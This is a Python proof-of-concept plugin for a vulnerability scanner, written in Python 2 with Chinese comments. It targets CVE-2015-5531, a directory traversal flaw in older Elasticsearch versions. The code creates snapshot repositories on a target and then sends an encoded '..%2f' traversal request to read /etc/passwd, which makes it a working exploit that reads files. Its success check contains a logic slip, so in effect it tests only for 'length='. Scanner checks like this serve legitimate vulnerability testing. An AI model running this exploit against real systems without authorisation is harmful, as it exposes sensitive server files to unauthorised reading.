# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import json

class Vuln(ABVuln):
    vuln_id = 'ElasticSearch_0004_p'  # 平台漏洞编号，留空
    name = 'ElasticSearch 目录穿越漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_TRAVERSAL  # 漏洞类型
    disclosure_date = '2015-07-21'  # 漏洞公布时间
    desc = '''
        源于程序没有充分过滤用户提交的输入，远程攻击者可借助目录遍历字符‘..’利用该漏洞访问包含敏感信息的任意文件。
    '''  # 漏洞描述
    ref = 'https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2015-5531'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'CVE-2015-5531'  # cve编号
    product = 'ElasticSearch'  # 漏洞应用名称
    product_version = '1.6.1以下'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '21735092-a2d7-4962-90d6-f06fb451ba9a'
    author = 'cscan'  # POC编写者
    create_date = '2018-04-28'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            data1 = '''{
                "type": "fs",
                "settings": {
                    "location": "/usr/share/elasticsearch/repo/test" 
                }
            }'''
            r1 = requests.put('{target}/_snapshot/test'.format(target=self.target), data=data1)
            #print(r1.text)

            data2 = '''{
                "type": "fs",
                "settings": {
                    "location": "/usr/share/elasticsearch/repo/test/snapshot-backdata" 
                }
            }'''
            
            r2 = requests.put('{target}/_snapshot/test2'.format(target=self.target), data=data2)
            #print(r2.text)

            payload = '/_snapshot/test/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd'
            r = requests.get('{target}{params}'.format(target=self.target, params=payload))
            #print(r.text)
            if 'offset='and'length=' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
